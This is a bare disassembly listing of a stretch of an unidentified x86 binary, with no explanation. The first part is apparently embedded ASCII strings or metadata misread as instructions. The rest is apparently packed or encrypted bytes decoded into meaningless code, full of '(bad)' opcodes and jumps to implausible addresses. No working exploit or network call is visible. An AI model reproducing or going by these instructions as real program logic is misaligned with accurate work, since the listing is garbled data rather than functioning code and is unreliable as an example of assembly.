  429095:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655201c1
  42909d:	ins    DWORD PTR es:[edi],dx
  42909e:	outs   dx,DWORD PTR ds:[esi]
  42909f:	jbe    0x429106
  4290a1:	inc    esi
  4290a2:	outs   dx,DWORD PTR ds:[esi]
  4290a3:	outs   dx,BYTE PTR ds:[esi]
  4290a4:	je     0x4290f8
  4290a6:	gs jae 0x429118
  4290a9:	jne    0x42911d
  4290ab:	arpl   WORD PTR [ebp+0x57],sp
  4290ae:	add    ah,bh
  4290b0:	add    DWORD PTR [ebx+0x65],edx
  4290b3:	je     0x42910b
  4290b5:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4290bc:	inc    ebp
  4290bd:	js     0x429133
  4290bf:	inc    ebp
  4290c0:	js     0x4290c2
  4290c2:	add    BYTE PTR [esi],dh
  4290c4:	add    DWORD PTR [edi+0x65],eax
  4290c7:	je     0x42910c
  4290c9:	ins    BYTE PTR es:[edi],dx
  4290ca:	imul   esi,DWORD PTR [eax+0x42],0x786f
  4290d1:	cmp    al,BYTE PTR [ecx]
  4290d3:	inc    edi
  4290d4:	gs je  0x42911a
  4290d7:	jne    0x42914b
  4290d9:	jb     0x429140
  4290db:	outs   dx,BYTE PTR ds:[esi]
  4290dc:	je     0x42912d
  4290de:	bound  ebp,QWORD PTR [edx+0x65]
  4290e1:	arpl   WORD PTR [eax+eax*1+0x0],si
  4290e5:	xchg   edx,eax
  4290e6:	add    BYTE PTR [ebx+0x72],al
  4290e9:	gs popa 
  4290eb:	je     0x429152
  4290ed:	inc    esp
  4290ee:	dec    ecx
  4290ef:	inc    edx
  4290f0:	push   ebx
  4290f1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4290f6:	outs   dx,BYTE PTR ds:[esi]
  4290f7:	add    BYTE PTR [eax],al
  4290f9:	out    0x1,al
  4290fb:	push   ebx
  4290fc:	gs je  0x42914b
  4290ff:	popa   
  429100:	jns    0x429171
  429102:	jne    0x429178
  429104:	add    BYTE PTR ds:0x61745302,al
  42910a:	jb     0x429180
  42910c:	push   eax
  42910d:	popa   
  42910e:	add    BYTE PTR gs:[bx+di+0x4f01],ah
  429114:	data16 data16 jae 0x42917d
  429118:	je     0x429170
  42911a:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  429121:	dec    edi
  429122:	jb     0x42918b
  429124:	inc    ebp
  429125:	js     0x429127
  429127:	add    DWORD PTR [bx+0x65],eax
  42912b:	je     0x42917c
  42912d:	bound  ebp,QWORD PTR [edx+0x65]
  429130:	arpl   WORD PTR [ecx+eax*2+0x0],si
  429134:	add    BYTE PTR [edx+eax*1],dl
  429137:	push   edi
  429138:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  429140:	add    BYTE PTR [ecx],al
  429142:	add    dl,BYTE PTR [ebx+0x65]
  429145:	je     0x42919e
  429147:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  42914e:	addr16 inc ebp
  429150:	js     0x429152
  429152:	add    BYTE PTR [edx+0x65724300],bl
  429158:	popa   
  429159:	je     0x4291c0
  42915b:	inc    esi
  42915c:	outs   dx,DWORD PTR ds:[esi]
  42915d:	outs   dx,BYTE PTR ds:[esi]
  42915e:	je     0x4291a9
  429160:	outs   dx,BYTE PTR ds:[esi]
  429161:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  429169:	mov    DWORD PTR [eax],0x6d756e45
  42916f:	inc    esi
  429170:	outs   dx,DWORD PTR ds:[esi]
  429171:	outs   dx,BYTE PTR ds:[esi]
  429172:	je     0x4291e7
  429174:	push   edi
  429175:	add    BYTE PTR [eax],al
  429177:	pop    es
  429178:	add    BYTE PTR [ecx+0x64],al
  42917b:	fs inc esi
  42917d:	outs   dx,DWORD PTR ds:[esi]
  42917e:	outs   dx,BYTE PTR ds:[esi]
  42917f:	je     0x4291d3
  429181:	gs jae 0x4291f3
  429184:	jne    0x4291f8
  429186:	arpl   WORD PTR [ebp+0x57],sp
  429189:	add    BYTE PTR [eax],al
  42918b:	xlat   BYTE PTR ds:[ebx]
  42918c:	add    DWORD PTR [ebx+0x65],edx
  42918f:	je     0x4291d3
  429191:	jb     0x429208
  429193:	jae    0x4291fd
  429195:	dec    edi
  429196:	jb     0x4291ff
  429198:	inc    ebp
  429199:	js     0x42919b
  42919b:	mov    ecx,0x63655201
  4291a0:	je     0x4291eb
  4291a2:	outs   dx,BYTE PTR ds:[esi]
  4291a3:	push   edx
  4291a4:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x1e80000
  4291ad:	push   ebx
  4291ae:	gs je  0x4291fe
  4291b1:	popa   
  4291b2:	jo     0x429201
  4291b4:	outs   dx,DWORD PTR ds:[esi]
  4291b5:	fs add BYTE PTR gs:[eax],al
  4291b9:	mov    cl,0x0
  4291bb:	inc    esp
  4291bc:	push   eax
  4291bd:	je     0x42922e
  4291bf:	dec    esp
  4291c0:	push   eax
  4291c1:	add    BYTE PTR [eax],al
  4291c3:	mov    esi,0x646e4500
  4291c8:	inc    esp
  4291c9:	outs   dx,DWORD PTR ds:[esi]
  4291ca:	arpl   WORD PTR [eax],ax
  4291cc:	add    BYTE PTR [edx+0x65724300],ah
  4291d2:	popa   
  4291d3:	je     0x42923a
  4291d5:	dec    ecx
  4291d6:	inc    ebx
  4291d7:	push   edi
  4291d8:	add    BYTE PTR [ebp+0x0],dh
  4291db:	inc    edx
  4291dc:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4291e5:	xchg   ecx,eax
  4291e6:	add    DWORD PTR [edi+0x65],eax
  4291e9:	je     0x429242
  4291eb:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4291f2:	addr16 inc ebp
  4291f4:	js     0x4291f6
  4291f6:	add    BYTE PTR [esi+0x65724300],ah
  4291fc:	popa   
  4291fd:	je     0x429264
  4291ff:	push   eax
  429200:	popa   
  429201:	je     0x429277
  429203:	gs jb  0x429274
  429206:	inc    edx
  429207:	jb     0x42927e
  429209:	jae    0x429273
  42920b:	add    BYTE PTR [eax],al
  42920d:	xchg   esp,eax
  42920e:	add    BYTE PTR [ebx+0x72],al
  429211:	gs popa 
  429213:	je     0x42927a
  429215:	inc    esp
  429216:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  42921d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  429221:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab0070
  429229:	inc    ebx
  42922a:	jb     0x429291
  42922c:	popa   
  42922d:	je     0x429294
  42922f:	push   edx
  429230:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  429235:	outs   dx,BYTE PTR ds:[esi]
  429236:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  42923d:	jo     0x4292b2
  42923f:	add    BYTE PTR gs:[ebp+0x65724300],ah
  429246:	popa   
  429247:	je     0x4292ae
  429249:	push   eax
  42924a:	popa   
  42924b:	ins    BYTE PTR es:[edi],dx
  42924c:	gs je  0x4292c3
  42924f:	add    BYTE PTR gs:[edi],cl
  429252:	add    dl,BYTE PTR [ebp+0x6e]
  429255:	jb     0x4292bc
  429257:	popa   
  429258:	ins    BYTE PTR es:[edi],dx
  429259:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  429260:	arpl   WORD PTR [eax+eax*1-0x2c],si
  429264:	add    BYTE PTR [ebp+0x78],al
  429267:	je     0x4292bd
  429269:	gs js  0x4292e0
  42926c:	dec    edi
  42926d:	jne    0x4292e3
  42926f:	inc    ecx
  429270:	add    BYTE PTR [ecx+0x1],bh
  429273:	inc    edi
  429274:	gs je  0x4292ca
  429277:	jns    0x4292ec
  429279:	je     0x4292e0
  42927b:	ins    DWORD PTR es:[edi],dx
  42927c:	push   eax
  42927d:	popa   
  42927e:	ins    BYTE PTR es:[edi],dx
  42927f:	gs je  0x4292f6
  429282:	gs inc ebp
  429284:	outs   dx,BYTE PTR ds:[esi]
  429285:	je     0x4292f9
  429287:	imul   esp,DWORD PTR [ebp+0x73],0x5201c600
  42928e:	outs   dx,DWORD PTR ds:[esi]
  42928f:	jne    0x4292ff
  429291:	fs push edx
  429293:	arpl   WORD PTR gs:[eax+eax*1+0x47],si
  429298:	inc    esp
  429299:	dec    ecx
  42929a:	xor    esi,DWORD PTR [edx]
  42929c:	cs fs ins BYTE PTR es:[edi],dx
  42929f:	ins    BYTE PTR es:[edi],dx
  4292a0:	add    BYTE PTR [eax+0x6b],ah
  4292a3:	adc    BYTE PTR [eax],al
  4292a5:	mov    dl,0x30
  4292a7:	adc    BYTE PTR [eax],al
  4292a9:	jp     0x429324
  4292ab:	adc    BYTE PTR [eax],al
  4292ad:	adc    al,0x2b
  4292af:	adc    BYTE PTR [eax],al
  4292b1:	in     eax,0x2f
  4292b3:	adc    BYTE PTR [eax],al
  4292b5:	inc    edi
  4292b6:	pop    esp
  4292b7:	adc    BYTE PTR [eax],al
  4292b9:	xchg   edx,eax
  4292ba:	dec    edi
  4292bb:	adc    BYTE PTR [eax],al
  4292bd:	xchg   ecx,eax
  4292be:	push   ecx
  4292bf:	adc    BYTE PTR [eax],al
  4292c1:	or     dl,BYTE PTR [bx+si]
  4292c4:	add    BYTE PTR [ebx+0x70],ah
  4292c7:	adc    BYTE PTR [eax],al
  4292c9:	xchg   esi,eax
  4292ca:	adc    BYTE PTR fs:[eax],al
  4292cd:	mov    dh,0x69
  4292cf:	adc    BYTE PTR [eax],al
  4292d1:	cdq    
  4292d2:	js     0x4292e4
  4292d4:	add    dl,bl
  4292d6:	data16 adc BYTE PTR [eax],al
  4292d9:	inc    edi
  4292da:	sub    dl,BYTE PTR [eax]
  4292dc:	add    BYTE PTR [eax+ebx*2-0x6d5efff0],ah
  4292e3:	inc    edx
  4292e4:	add    BYTE PTR [ebp-0x56ffbd6e],ah
  4292ea:	xchg   edx,eax
  4292eb:	inc    edx
  4292ec:	add    BYTE PTR [ebp-0x4effbd6e],ch
  4292f2:	xchg   edx,eax
  4292f3:	inc    edx
  4292f4:	add    BYTE PTR [ebp-0x46ffbd6e],dh
  4292fa:	xchg   edx,eax
  4292fb:	inc    edx
  4292fc:	add    BYTE PTR [ebp+0x4d004292],bh
  429302:	push   ebp
  429303:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  429309:	mov    esp,ebp
  42930b:	or     ah,dh
  42930d:	dec    ebp
  42930e:	add    bh,al
  429310:	add    BYTE PTR [eax],cl
  429312:	add    BYTE PTR [eax],al
  429314:	mov    DWORD PTR [eax],0x40f44545
  42931a:	xor    eax,0x9c8b8500
  42931f:	hlt    
  429320:	clc    
  429321:	retf   
  429322:	(bad)  
  429323:	enter  0x4d45,0xbc
  429327:	mov    esi,DWORD PTR [esp+esi*8]
  42932a:	test   ebx,ecx
  42932c:	pushf  
  42932d:	enter  0x4df8,0x8b
  429331:	mov    DWORD PTR [ebp-0x20],0x890208
  429338:	inc    ebp
  429339:	inc    ebp
  42933a:	cld    
  42933b:	xor    cl,BYTE PTR [ebx-0xb38b300]
  429341:	or     BYTE PTR [ebx+0x0],dl
  429344:	mov    ebx,0x8bd5700
  429349:	call   DWORD PTR [ecx-0x1]
  42934c:	pop    es
  42934d:	mov    ch,0x33
  42934f:	dec    ebx
  429351:	(bad)  
  429352:	mov    eax,0x72009ea4
  429357:	push   DWORD PTR [edx]
  429359:	or     BYTE PTR [eax],al
  42935b:	jmp    0xff89:0x75c84d03
  429362:	dec    ebp
  429363:	loopne 0x429335
  429365:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  42936b:	add    BYTE PTR [ebx],dh
  42936d:	mov    ecx,ebx
  42936f:	hlt    
  429370:	add    ecx,ebx
  429372:	enter  0x899e,0x32
  429376:	dec    ebp
  429377:	add    ecx,eax
  429379:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  42937f:	or     DWORD PTR [ebx-0xb00b29c],0x0
  429386:	xor    ecx,ebx
  429388:	retf   
  429389:	enter  0x4d03,0xc8
  42938d:	mov    DWORD PTR fs:[eax],ebx
  429390:	lea    eax,[eax]
  429392:	push   esp
  429393:	mov    edi,edi
  429395:	fs (bad) 
  429397:	(bad)  
  429398:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  42939e:	push   0xffffffff
  4293a0:	and    bh,bh
  4293a2:	pop    ecx
  4293a3:	inc    eax
  4293a4:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4293aa:	push   0xffffff8b
  4293ac:	pop    ecx
  4293ad:	cld    
  4293ae:	dec    ebp
  4293af:	lea    ecx,[ecx+0x45ff08ff]
  4293b5:	mov    BYTE PTR [edx+0x1],cl
  4293b8:	add    BYTE PTR [eax],al
  4293ba:	mov    DWORD PTR [ebp+0x8],0x58008d
  4293c1:	dec    DWORD PTR [ebp-0x77]
  4293c4:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4293cb:	cld    
  4293cc:	dec    ebp
  4293cd:	jne    0x429402
  4293cf:	lea    eax,[ebx]
  4293d1:	push   eax
  4293d2:	mov    edi,edi
  4293d4:	or     BYTE PTR [ecx+0x54a845],cl
  4293da:	add    al,ch
  4293dc:	(bad)  
  4293dd:	sub    esp,ebp
  4293df:	add    BYTE PTR [eax],al
  4293e1:	rol    BYTE PTR [eax],0x84
  4293e4:	inc    ebp
  4293e5:	add    dh,BYTE PTR [esi+0x0]
  4293e8:	add    BYTE PTR [ebp-0x73],al
  4293eb:	mov    ebp,DWORD PTR [esp+edx*4]
  4293ee:	inc    DWORD PTR [eax]
  4293f0:	lea    ecx,[ebx-0x30074f4]
  4293f6:	call   0x439f7b
  4293fb:	add    BYTE PTR [ebp+0x0],cl
  4293fe:	jne    0x429441
  429400:	dec    DWORD PTR [ebx-0x76210314]
  429406:	dec    ebp
  429407:	add    DWORD PTR [ebp+0x0],esi
  42940a:	(bad)  
  42940b:	xchg   ebp,eax
  42940c:	loopne 0x42940d
  42940e:	inc    eax
  42940f:	inc    DWORD PTR [eax]
  429411:	mov    ecx,DWORD PTR [ebp-0x4]
  429414:	xor    edx,DWORD PTR [edx+0x7201b8]
  42941a:	add    BYTE PTR [edx],dl
  42941c:	enter  0x4d90,0x0
  429420:	mov    eax,DWORD PTR [eax]
  429422:	hlt    
  429423:	add    al,0xa5
  429425:	mov    al,0xff
  429427:	add    bh,bh
  429429:	add    BYTE PTR [ebx],dh
  42942b:	inc    DWORD PTR [ebx]
  42942d:	sbb    al,0x89
  42942f:	jne    0x429409
  429431:	mov    esp,DWORD PTR [ecx+0x4500fc]
  429437:	mov    eax,DWORD PTR [ebp-0xff0048]
  42943d:	mov    DWORD PTR [eax-0x70],0xee58e189
  429444:	inc    DWORD PTR [ebp-0x75]
  429447:	ror    DWORD PTR [esp+ebp*8],1
  42944a:	test   DWORD PTR [esi-0x1],esp
  42944d:	inc    ebp
  42944e:	(bad)  
  42944f:	aas    
  429450:	inc    ebp
  429451:	(bad)  
  429452:	lea    edi,[esp+eiz*2-0x1]
  429456:	push   DWORD PTR [edi]
  429458:	mov    DWORD PTR [ecx],esi
  42945a:	mov    al,ds:0x8b8000c7
  42945f:	out    dx,al
  429460:	cld    
  429461:	call   0xed41d9f3
  429466:	(bad)  
  429467:	fisttp WORD PTR [eax+0x8801c7]
  42946d:	jmp    0x4294b4
  42946f:	out    dx,al
  429470:	inc    DWORD PTR [ebp-0x4]
  429473:	xlat   BYTE PTR ds:[ebx]
  429474:	lea    edi,[edi]
  429476:	inc    edi
  429478:	jmp    FWORD PTR [eax-0x78]
  42947b:	inc    DWORD PTR [ecx]
  42947d:	aaa    
  42947e:	add    BYTE PTR [ecx],dh
  429480:	repnz mov DWORD PTR [eax],0xfff856c
  429487:	ffreep st(5)
  429489:	aas    
  42948a:	add    bh,al
  42948c:	mov    esi,DWORD PTR [eax-0x4]
  42948f:	inc    DWORD PTR [eax+0xdf01ec]
  429495:	(bad)  
  429496:	or     BYTE PTR [ebp+eax*2-0x1],dh
  42949a:	mov    esp,ebx
  42949c:	xchg   esp,eax
  42949d:	rol    DWORD PTR [eax],cl
  42949f:	(bad)  
  4294a0:	mov    edi,DWORD PTR [eax+0x3]
  4294a3:	(bad)  
  4294a4:	cmp    al,0xd7
  4294a6:	dec    ebp
  4294a7:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  4294ad:	add    BYTE PTR [ebp-0x3b375],cl
  4294b3:	adc    BYTE PTR [edx+0x1],0x55
  4294b7:	add    BYTE PTR [ebx+0x58c30],cl
  4294bd:	add    BYTE PTR [ebx-0x778afc7b],cl
  4294c3:	mov    eax,DWORD PTR [eax]
  4294c5:	cld    
  4294c6:	push   0x7d
  4294c8:	dec    DWORD PTR [ebx+0xd88c]
  4294ce:	push   edx
  4294cf:	mov    edx,DWORD PTR [ecx-0x4]
  4294d2:	call   DWORD PTR [eax+0x7d01fc]
  4294d8:	mov    esp,DWORD PTR [esp+edi*8]
  4294db:	add    BYTE PTR [eax+0x560150],dl
  4294e1:	test   DWORD PTR [ebp+0x75],eax
  4294e4:	call   0xc83f7574
  4294e9:	jge    0x42947f
  4294eb:	mov    ebp,ebx
  4294ed:	fcom   st(7)
  4294ef:	add    bh,al
  4294f1:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  4294f7:	add    edi,edi
  4294f9:	add    bh,bh
  4294fb:	add    ah,cl
  4294fd:	add    ah,dl
  4294ff:	push   eax
  429500:	inc    ebp
  429501:	push   esi
  429502:	fisttp WORD PTR [ebx+0x4dc7f43f]
  429508:	test   BYTE PTR [ebx],dh
  42950a:	aam    0x5
  42950c:	retf   0x4572
  42950f:	add    bl,ah
  429511:	rcl    ebx,0x84
  429514:	mov    DWORD PTR [ecx],0x46d1008c
  42951a:	jl     0x42951c
  42951c:	test   edi,eax
  42951e:	jmp    esp
  429520:	inc    DWORD PTR [eax]
  429522:	loope  0x429524
  429524:	aam    0x75
  429526:	test   DWORD PTR [ebx+0x45fffcff],ecx
  42952c:	out    dx,al
  42952d:	mov    ebp,eax
  42952f:	mov    ah,0x85
  429531:	add    bh,bh
  429533:	call   0x116be37
  429538:	retf   0x858b
  42953b:	cld    
  42953c:	inc    DWORD PTR [eax+0xeb01ff]
  429542:	out    dx,al
  429543:	xor    BYTE PTR [ebp-0xff0085],al
  429549:	mov    edx,ecx
  42954b:	cld    
  42954c:	jl     0x4294d7
  42954e:	push   ebx
  42954f:	add    DWORD PTR [eax],eax
  429551:	add    BYTE PTR [eax+0x1],dl
  429554:	inc    ebp
  429555:	inc    ebp
  429556:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  42955c:	dec    DWORD PTR [ebx-0x3fd90318]
  429562:	add    BYTE PTR [ebp-0xbf0040],dl
  429568:	inc    ebp
  429569:	retf   0x8b
  42956c:	cld    
  42956d:	push   eax
  42956e:	mov    al,0x45
  429570:	add    DWORD PTR [ebx+0x459c00],ecx
  429576:	mov    edi,edi
  429578:	mov    eax,0xe80800ff
  42957d:	inc    ebp
  42957e:	sub    DWORD PTR [ebx-0x47000400],ecx
  429584:	add    al,0x1
  429586:	rol    BYTE PTR [eax],0x1e
  429589:	jne    0x4295d0
  42958b:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  429591:	inc    DWORD PTR [ecx]
  429593:	call   0x87bd98
  429598:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  42959e:	call   0x42bea4
  4295a3:	xor    bh,bh
  4295a5:	push   edi
  4295a6:	adc    BYTE PTR [ebx-0x747423bb],al
  4295ac:	loopne 0x42958a
  4295ae:	ret    
  4295af:	loopne 0x42954f
  4295b1:	xor    DWORD PTR [edx],0x31
  4295b4:	cmp    edi,edi
  4295b6:	bswap  esp
  4295b8:	rol    BYTE PTR gs:[eax],0x5
  4295bc:	jmp    0x12d9706
  4295c1:	mov    eax,DWORD PTR [ebp-0x4]
  4295c4:	add    BYTE PTR [eax+0xff0100],bh
  4295ca:	cld    
  4295cb:	jne    0x42964a
  4295cd:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4295d3:	pusha  
  4295d4:	add    DWORD PTR [eax],eax
  4295d6:	add    BYTE PTR [eax-0x37],dl
  4295d9:	inc    ebp
  4295da:	add    BYTE PTR [ebx+0x459850],cl
  4295e0:	mov    edi,edi
  4295e2:	test   al,0xff
  4295e4:	add    BYTE PTR [eax],cl
  4295e6:	inc    DWORD PTR [ebp-0x18]
  4295e9:	jmp    DWORD PTR ds:0x4d7d00dc
  4295ef:	adc    BYTE PTR [ebx+0x459cb9],cl
  4295f5:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4295fb:	sahf   
  4295fc:	mov    eax,0x30132
  429601:	lea    esi,[ebp+0x2c]
  429604:	xor    edi,edi
  429606:	(bad)  
  429607:	call   0x141be74
  42960c:	call   0x136be9c
  429611:	jne    0x42959e
  429613:	xor    edi,esp
  429615:	add    eax,DWORD PTR [eax+0xc018d]
  42961b:	push   DWORD PTR [eax]
  42961d:	call   0xcbbe79
  429622:	int3   
  429623:	inc    DWORD PTR [ebp-0x14]
  429626:	mov    ecx,DWORD PTR [ebp-0x28]
  429629:	xor    eax,DWORD PTR [eax]
  42962b:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  429631:	(bad)  
  429632:	xchg   ebp,eax
  429633:	in     al,0xff
  429635:	add    bh,bh
  429637:	add    BYTE PTR [edi+0x508b0045],bl
  42963d:	or     BYTE PTR [ebp-0x3d],al
  429640:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  429647:	mov    edi,edi
  429649:	or     BYTE PTR [eax],cl
  42964b:	inc    ebp
  42964c:	test   DWORD PTR gs:[eax],eax
  42964f:	je     0x429696
  429651:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  429657:	xor    edx,DWORD PTR [eax-0x73]
  42965a:	push   ebp
  42965b:	or     BYTE PTR [ebp+0x21007572],al
  429661:	inc    ebp
  429662:	in     al,dx
  429663:	mov    ebp,DWORD PTR [eax]
  429665:	mov    esp,0x628bc345
  42966a:	fmul   st,st(5)
  42966c:	add    BYTE PTR [ebx],ch
  42966e:	mov    eax,DWORD PTR [ebx]
  429670:	cld    
  429671:	loopne 0x429633
  429673:	inc    ebp
  429674:	push   ebp
  429675:	cmp    ebp,eax
  429677:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  42967e:	cld    
  42967f:	fadd   DWORD PTR [eax+0x3b014d]
  429685:	jne    0x4296b7
  429687:	push   0xf8898557
  42968c:	in     al,dx
  42968d:	jne    0x4296d4
  42968f:	lea    eax,[ebx+0x72e8dcc8]
  429695:	xor    BYTE PTR [ebx+0x7545bc00],cl
  42969b:	jmp    0x4296d0
  42969d:	mov    edi,DWORD PTR [edi+0x4572bc]
  4296a3:	xor    eax,edi
  4296a5:	adc    DWORD PTR [ebp-0xcd0062],0x8b2b31
  4296af:	rcl    BYTE PTR [eax-0x40],1
  4296b2:	inc    ebp
  4296b3:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4296bb:	inc    ebp
  4296bc:	xchg   ebp,eax
  4296bd:	ud0    ebp,DWORD PTR [ebx]
  4296c0:	inc    DWORD PTR [eax]
  4296c2:	adc    eax,0x508a0076
  4296c7:	adc    BYTE PTR [ebp+0x1f],0x8b
  4296cb:	or     al,0xf4
  4296cd:	inc    eax
  4296ce:	retf   
  4296cf:	inc    ebp
  4296d0:	iret   
  4296d1:	jb     0x42969b
  4296d3:	mov    eax,DWORD PTR [edi]
  4296d5:	enter  0x4545,0x1
  4296d9:	xor    eax,0x898b9c00
  4296de:	mov    esp,0x33344df0
  4296e3:	pushf  
  4296e4:	lea    ecx,[ecx+0x4d72e008]
  4296ea:	add    BYTE PTR [ebx],dh
  4296ec:	inc    ebp
  4296ed:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  4296f3:	xor    dl,BYTE PTR [edx]
  4296f5:	add    eax,DWORD PTR [ebp-0x77]
  4296f8:	mov    eax,esp
  4296fa:	fmul   DWORD PTR [ebp-0x3d]
  4296fd:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  429704:	mov    DWORD PTR [ebp-0x28],eax
  429707:	aad    0x45
  429709:	pushf  
  42970a:	xor    eax,edi
  42970c:	mov    ecx,0xff858db0
  429711:	clc    
  429712:	enter  0x4d45,0x32
  429716:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  42971d:	test   esi,edi
  42971f:	clc    
  429720:	inc    DWORD PTR [ebp+0x45]
  429723:	xor    BYTE PTR [ebx-0x3738f764],cl
  429729:	test   al,0x16
  42972b:	test   DWORD PTR ds:0xff459cf8,esi
  429731:	ds cld 
  429733:	pushf  
  429734:	inc    ebp
  429735:	mov    edx,DWORD PTR [eax-0x28]
  429738:	popf   
  429739:	push   ebp
  42973a:	add    BYTE PTR [ebx],dh
  42973c:	mov    DWORD PTR [ebx],eax
  42973e:	sar    BYTE PTR [ebx],1
  429740:	adc    BYTE PTR [edi],cl
  429742:	dec    ebp
  429743:	adc    al,0x8b
  429745:	add    al,dl
  429747:	jmp    0x1039917
  42974c:	jb     0x42979b
  42974e:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  429754:	xor    ecx,DWORD PTR [ebp+0x3b]
  429757:	xor    ecx,DWORD PTR [edi]
  429759:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  42975d:	(bad)  
  42975f:	clc    
  429760:	enter  0x8400,0x8b
  429764:	pop    es
  429765:	mov    al,0x0
  429767:	push   ebp
  429768:	push   cs
  429769:	xor    ecx,eax
  42976b:	xor    esp,ecx
  42976d:	add    ebp,DWORD PTR [eax]
  42976f:	add    esi,DWORD PTR [eax]
  429771:	(bad)  
  429773:	retf   0x55c8
  429776:	repnz mov eax,DWORD PTR [ebp-0x10]
  42977a:	(bad)  
  42977b:	cli    
  42977c:	fdivr  st,st(1)
  42977e:	test   DWORD PTR [eax+edi*8],ecx
  429781:	dec    ebp
  429782:	inc    ebp
  429783:	xor    edi,DWORD PTR [eax-0x7167afd]
  429789:	add    BYTE PTR [ebp+0x0],al
  42978c:	mov    ecx,DWORD PTR [ebp-0x28]
  42978f:	mov    ecx,ebx
  429791:	clc    
  429792:	jne    0x42975f
  429794:	mov    esi,0xd672d3
  429799:	into   
  42979a:	into   
  42979b:	scas   eax,DWORD PTR es:[edi]
  42979c:	dec    ebp
  42979d:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4297a3:	sub    ecx,esi
  4297a5:	cmp    ecx,DWORD PTR [ebp+0x77]
  4297a8:	(bad)  
  4297a9:	mov    edi,eax
  4297ab:	mov    al,0x85
  4297ad:	mov    eax,edi
  4297af:	add    BYTE PTR [ebp-0x75],al
  4297b2:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4297b9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4297bf:	rdtsc  
  4297c1:	retf   0x559c
  4297c4:	(bad)  
  4297c5:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4297cc:	inc    ebp
  4297cd:	add    eax,0xeb9c4d3f
  4297d2:	(bad)  
  4297d3:	mov    ecx,esp
  4297d5:	lods   al,BYTE PTR ds:[esi]
  4297d6:	test   DWORD PTR [ebp-0x8],edx
  4297d9:	xor    ecx,DWORD PTR [ebp+0x33]
  4297dc:	mov    eax,DWORD PTR [ebx]
  4297de:	lock add ecx,ebx
  4297e1:	bswap  esi
  4297e3:	retf   0x55d1
  4297e6:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4297ec:	jmp    0x4297e7
  4297ee:	add    BYTE PTR ds:0xebc44d8b,al
  4297f4:	push   ebp
  4297f5:	mov    ebp,DWORD PTR [ebx]
  4297f7:	test   al,0x8b
  4297f9:	push   ebp
  4297fa:	clc    
  4297fb:	xor    ecx,ebx
  4297fd:	xor    ecx,esi
  4297ff:	add    edx,ecx
  429801:	add    eax,DWORD PTR [edx+0xca010f]
  429807:	push   ebp
  429808:	dec    ebp
  429809:	mov    ecx,DWORD PTR [ebx-0x34050710]
  42980f:	stc    
  429810:	rol    DWORD PTR ds:0xebce4dd6,cl
  429816:	scas   eax,DWORD PTR es:[edi]
  429817:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  42981d:	xor    ebp,DWORD PTR [ebx]
  42981f:	xor    edi,DWORD PTR [ebx]
  429821:	add    esi,DWORD PTR [edi+0x3]
  429824:	mov    ecx,DWORD PTR [edi]
  429826:	clc    
  429827:	retf   0x55cb
  42982a:	into   
  42982b:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  429832:	mov    eax,0x3376554d
  429837:	mov    esi,DWORD PTR [ebx]
  429839:	int3   
  42983a:	add    edx,DWORD PTR [ebp+0x3]
  42983d:	xor    ecx,DWORD PTR [edi]
  42983f:	xor    ecx,edx
  429841:	add    edx,DWORD PTR [ebp+0x3]
  429844:	mov    ecx,DWORD PTR [edi]
  429846:	lock retf 0x4dfa
  42984a:	stc    
  42984b:	mov    ecx,DWORD PTR [eax]
  42984d:	or     BYTE PTR [ebp+0x4d],cl
  429850:	jmp    0x10698e0
  429855:	dec    ebp
  429856:	dec    ebp
  429857:	(bad)  
  429858:	mov    ebx,esp
  42985a:	clc    
  42985b:	test   ebx,ecx
  42985d:	clc    
  42985e:	ror    DWORD PTR [ebp-0x2a],cl
  429861:	mov    esi,ecx
  429863:	call   0x33cdde17
  429868:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  42986f:	retf   
  429870:	ja     0x429840
  429872:	mov    ebp,DWORD PTR [eax-0x48]
  429875:	dec    ebp
  429876:	xor    ecx,DWORD PTR [di+0x3]
  42987a:	mov    esp,esp
  42987c:	clc    
  42987d:	push   ebp
  42987e:	retf   
  42987f:	mov    dl,bl
  429881:	adc    esi,edx
  429883:	jb     0x429853
